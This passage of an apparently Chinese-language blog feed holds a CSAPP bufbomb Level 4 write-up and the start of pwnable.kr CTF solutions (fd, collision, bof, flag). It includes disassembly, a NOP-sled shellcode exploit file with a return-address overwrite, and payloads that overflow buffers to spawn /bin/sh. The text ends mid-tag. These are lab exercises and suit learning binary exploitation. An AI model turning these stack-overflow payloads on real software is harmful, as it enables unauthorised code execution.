string:Boom!: getbuf returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">VALID</span><br><span class="hljs-attribute">NICE</span> JOB!<br></code></pre></td></tr></table></figure><h1 id="Level-4-Nitroglycerin-10-pts"><a href="#Level-4-Nitroglycerin-10-pts" class="headerlink" title="Level 4: Nitroglycerin (10 pts)"></a>Level 4: Nitroglycerin (10 pts)</h1><p>要求：</p><ul><li>使用-n选项运行，这会使程序调用testn、getbufn函数，而非之前的test、getbuf函数</li><li>getbufn函数会被调用5次</li><li>每一次输入的字符串都相同</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">08048e26</span> &lt;testn&gt;:<br> <span class="hljs-attribute">8048e26</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">8048e27</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">8048e29</span>:<span class="hljs-number">53</span>                   push   %ebx<br> <span class="hljs-attribute">8048e2a</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">24</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">24</span>,%esp<br> <span class="hljs-attribute">8048e2d</span>:e<span class="hljs-number">8</span> <span class="hljs-number">5</span>e ff ff ff       call   <span class="hljs-number">8048</span>d<span class="hljs-number">90</span> &lt;uniqueval&gt;<br> <span class="hljs-attribute">8048e32</span>:<span class="hljs-number">89</span> <span class="hljs-number">45</span> f<span class="hljs-number">4</span>             mov    %eax,-<span class="hljs-number">0</span>xc(%ebp)<br> <span class="hljs-attribute">8048e35</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">2</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">804920</span>c &lt;getbufn&gt;<br> <span class="hljs-attribute">8048e3a</span>:<span class="hljs-number">89</span> c<span class="hljs-number">3</span>                mov    %eax,%ebx<br> <span class="hljs-attribute">8048e3c</span>:e<span class="hljs-number">8</span> <span class="hljs-number">4</span>f ff ff ff       call   <span class="hljs-number">8048</span>d<span class="hljs-number">90</span> &lt;uniqueval&gt;<br> <span class="hljs-attribute">8048e41</span>:<span class="hljs-number">8</span>b <span class="hljs-number">55</span> f<span class="hljs-number">4</span>             mov    -<span class="hljs-number">0</span>xc(%ebp),%edx<br> <span class="hljs-attribute">8048e44</span>:<span class="hljs-number">39</span> d<span class="hljs-number">0</span>                cmp    %edx,%eax<br> <span class="hljs-attribute">8048e46</span>:<span class="hljs-number">74</span> <span class="hljs-number">0</span>e                je     <span class="hljs-number">8048</span>e<span class="hljs-number">56</span> &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">30</span>&gt;<br> <span class="hljs-attribute">8048e48</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">88</span> a<span class="hljs-number">3</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">388</span>,(%esp)<br> <span class="hljs-attribute">8048e4f</span>:e<span class="hljs-number">8</span> <span class="hljs-number">6</span>c fa ff ff       call   <span class="hljs-number">80488</span>c<span class="hljs-number">0</span> &lt;puts@plt&gt;<br> <span class="hljs-attribute">8048e54</span>:eb <span class="hljs-number">46</span>                jmp    <span class="hljs-number">8048</span>e<span class="hljs-number">9</span>c &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">76</span>&gt;<br> <span class="hljs-attribute">8048e56</span>:<span class="hljs-number">3</span>b <span class="hljs-number">1</span>d <span class="hljs-number">08</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span>    cmp    <span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">108</span>,%ebx<br> <span class="hljs-attribute">8048e5c</span>:<span class="hljs-number">75</span> <span class="hljs-number">26</span>                jne    <span class="hljs-number">8048</span>e<span class="hljs-number">84</span> &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">5</span>e&gt;<br> <span class="hljs-attribute">8048e5e</span>:<span class="hljs-number">89</span> <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    %ebx,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048e62</span>:c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> b<span class="hljs-number">4</span> a<span class="hljs-number">3</span> <span class="hljs-number">04</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">3</span>b<span class="hljs-number">4</span>,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048e69</span>:<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048e6a</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048e71</span>:e<span class="hljs-number">8</span> <span class="hljs-number">4</span>a fb ff ff       call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048e76</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">4</span>,(%esp)<br> <span class="hljs-attribute">8048e7d</span>:e<span class="hljs-number">8</span> f<span class="hljs-number">9</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">804937</span>b &lt;validate&gt;<br> <span class="hljs-attribute">8048e82</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">8048</span>e<span class="hljs-number">9</span>c &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">76</span>&gt;<br> <span class="hljs-attribute">8048e84</span>:<span class="hljs-number">89</span> <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    %ebx,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048e88</span>:c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">62</span> a<span class="hljs-number">5</span> <span class="hljs-number">04</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">562</span>,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048e8f</span>:<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048e90</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048e97</span>:e<span class="hljs-number">8</span> <span class="hljs-number">24</span> fb ff ff       call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048e9c</span>:<span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">24</span>             add    $<span class="hljs-number">0</span>x<span class="hljs-number">24</span>,%esp<br> <span class="hljs-attribute">8048e9f</span>:<span class="hljs-number">5</span>b                   pop    %ebx<br> <span class="hljs-attribute">8048ea0</span>:<span class="hljs-number">5</span>d                   pop    %ebp<br> <span class="hljs-attribute">8048ea1</span>:c<span class="hljs-number">3</span>                   ret    <br><br><span class="hljs-attribute">0804920c</span> &lt;getbufn&gt;:<br> <span class="hljs-attribute">804920c</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">804920d</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">804920f</span>:<span class="hljs-number">81</span> ec <span class="hljs-number">18</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    sub    $<span class="hljs-number">0</span>x<span class="hljs-number">218</span>,%esp<br> <span class="hljs-attribute">8049215</span>:<span class="hljs-number">8</span>d <span class="hljs-number">85</span> f<span class="hljs-number">8</span> fd ff ff    lea    -<span class="hljs-number">0</span>x<span class="hljs-number">208</span>(%ebp),%eax<br> <span class="hljs-attribute">804921b</span>:<span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             mov    %eax,(%esp)<br> <span class="hljs-attribute">804921e</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">7</span> fa ff ff       call   <span class="hljs-number">8048</span>cfa &lt;Gets&gt;<br> <span class="hljs-attribute">8049223</span>:b<span class="hljs-number">8</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax<br> <span class="hljs-attribute">8049228</span>:c<span class="hljs-number">9</span>                   leave  <br> <span class="hljs-attribute">8049229</span>:c<span class="hljs-number">3</span>                   ret    <br> <span class="hljs-attribute">804922a</span>:<span class="hljs-number">90</span>                   nop<br> <span class="hljs-attribute">804922b</span>:<span class="hljs-number">90</span>                   nop<br></code></pre></td></tr></table></figure><p>断点调试：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">b</span> testn<br><br><span class="hljs-keyword">b</span> getbufn<br><br><span class="hljs-symbol">run</span> -n -u nmsl &lt; exploit.txt<br></code></pre></td></tr></table></figure><p>在五次调用getbuf的过程中，ebp的值统计如下：</p><p>testn<br>ebp:0x55683880、0x556838e0、0x55683800、0x55683880、0x55683840</p><p>getbuf<br>ebp:0x55683850、0x556838b0、0x556837d0、0x55683850、0x55683810</p><p>getbufn开辟的缓冲区大小是520，也即是说，buf[0]的地址是ebp-520，因此buf[0]的地址有这些可能：55683648、556836A8、556835C8、55683648、55683608，<strong>为了保证注入代码都可以执行，选择地址最大的556836A8作为覆盖的返回地址</strong></p><p>注入代码：</p><ul><li>将eax赋值为$0x6185560e</li><li>恢复ebp，也即是将esp+0x28赋给ebp</li><li>push返回地址，ret</li><li>覆盖返回地址</li></ul><p>exploit.txt:</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tap">515 +<span class="hljs-number"> 15 </span>+<span class="hljs-number"> 4 </span>+ 4<br><br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br><br>// ...... 一共是515个0x90<br><br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>b8 0e<span class="hljs-number"> 56 </span>85<span class="hljs-number"> 61 </span>//注入的二进制代码<br>8d 6c<span class="hljs-number"> 24 </span>28 <br>68 3a 8e<span class="hljs-number"> 04 </span>08 <br>c3<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>  //ebp<br>A8<span class="hljs-number"> 36 </span>68<span class="hljs-number"> 55 </span>  //返回地址，跳转到buf[0]<br></code></pre></td></tr></table></figure><p>测试：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> exploit.txt | ./hex<span class="hljs-number">2</span>raw -n | ./bufbomb -n -u nmsl<br><br><span class="hljs-attribute">Userid</span>: nmsl<br><span class="hljs-attribute">Cookie</span>: <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">VALID</span><br><span class="hljs-attribute">NICE</span> JOB!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnable.kr 刷题记录</title>
    <link href="/p/f57f952b/"/>
    <url>/p/f57f952b/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/pwnable.png"></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><strong>使用ssh连接到远程shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh fd@pwnable.kr -p2222 (pw:guest)<br></code></pre></td></tr></table></figure><p><strong>使用scp将远程文件传输到本地</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"> - Use a specific port when connecting to the remote host:<br>   scp -P &#123;&#123;port&#125;&#125; &#123;&#123;path/to/local_file&#125;&#125; &#123;&#123;remote_host&#125;&#125;:&#123;&#123;path/to/remote_file&#125;&#125;<br><br>scp -P 2222  username@pwnable.kr:/home/username/* .<br></code></pre></td></tr></table></figure><p><strong>使用pwntools远程连接到服务器并运行程序</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ssh = ssh(host=<span class="hljs-string">&#x27;pwnable.kr&#x27;</span>,user=<span class="hljs-string">&#x27;&#x27;</span>,password=<span class="hljs-string">&#x27;&#x27;</span>,port=)<br>sh=ssh.process(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br><br>sh.recv()<br><br>payload=<br><br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>看一下fd程序的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">$ cat fd.c<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">32</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>* envp[])</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pass argv[1] a number\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">int</span> fd = atoi( argv[<span class="hljs-number">1</span>] ) - <span class="hljs-number">0x1234</span>;<br>        <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>        len = read(fd, buf, <span class="hljs-number">32</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;good job :)\n&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;learn about Linux file IO\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>以<code>atoi( argv[1] ) - 0x1234</code>为fd，在其中读取32字节的字符串，之后与LETMEWIN比较，即可得到flag</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">$ ./fd <span class="hljs-number">4660</span><br>LETMEWIN<br>good <span class="hljs-keyword">job</span> :)<br></code></pre></td></tr></table></figure><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">$ cat col.c<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> hashcode = <span class="hljs-number">0x21DD09EC</span>;<br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">check_password</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* p)</span></span>&#123;<br>        <span class="hljs-keyword">int</span>* ip = (<span class="hljs-keyword">int</span>*)p;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">int</span> res=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;<br>                res += ip[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]) != <span class="hljs-number">20</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;passcode length should be 20 bytes\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(hashcode == check_password( argv[<span class="hljs-number">1</span>] ))&#123;<br>                system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong passcode.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们要输入20个字节，每四个字节（五个数字）会被当做int类型加在一起，也即是$4*5=20$。这五个数字的和必须满足是0x21DD09EC，才能得到flag</p><p>打开python，做一下加减乘除</p><p>$0x21DD09EC=568134124/5=113626824.8$</p><p>$568134124-4*113626824=113626828$</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hex</span>(<span class="hljs-number">113626824</span>)=&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">6</span>c<span class="hljs-number">5</span>cec<span class="hljs-number">8</span>&#x27;<br><span class="hljs-attribute">hex</span>(<span class="hljs-number">113626828</span>)=&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">6</span>c<span class="hljs-number">5</span>cecc&#x27;<br></code></pre></td></tr></table></figure><p>所以我们构造4个’0x6c5cec8’和一个0x6c5cecc就行了</p><p>由于小端序，我们需要将字节序列翻转一下</p><p>由于会出现不可见字符，我们很难把它们打印出来，因此可以使用python2的命令行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./col `python -c <span class="hljs-string">&#x27;print &quot;\xc8\xce\xc5\x06&quot; * 4 + &quot;\xcc\xce\xc5\x06&quot;&#x27;</span>`<br></code></pre></td></tr></table></figure><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>看一下源码，发现是一个简单的栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span></span>&#123;<br>        <span class="hljs-keyword">char</span> overflowme[<span class="hljs-number">32</span>];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;overflow me : &quot;</span>);<br>        gets(overflowme);       <span class="hljs-comment">// smash me!</span><br>        <span class="hljs-keyword">if</span>(key == <span class="hljs-number">0xcafebabe</span>)&#123;<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nah..\n&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>&#123;<br>        func(<span class="hljs-number">0xdeadbeef</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看一下保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">$ pwn checksec code/bof<br>[*] <span class="hljs-string">&#x27;/home/philo/code/bof&#x27;</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure><p>func函数只有一个参数key，这里传入的是0xdeadbeef，如果我们将这个参数改为0xcafebabe，那么就会触发system(“/bin/sh”)</p><p>算一下偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-2Ch] BYREF</span><br></code></pre></td></tr></table></figure><p><code>payload=b&#39;a&#39;*(0x2c+8)+p32(0xcafebabe)</code></p><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>看一下保护</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./flag</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/code/flag&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br>    <span 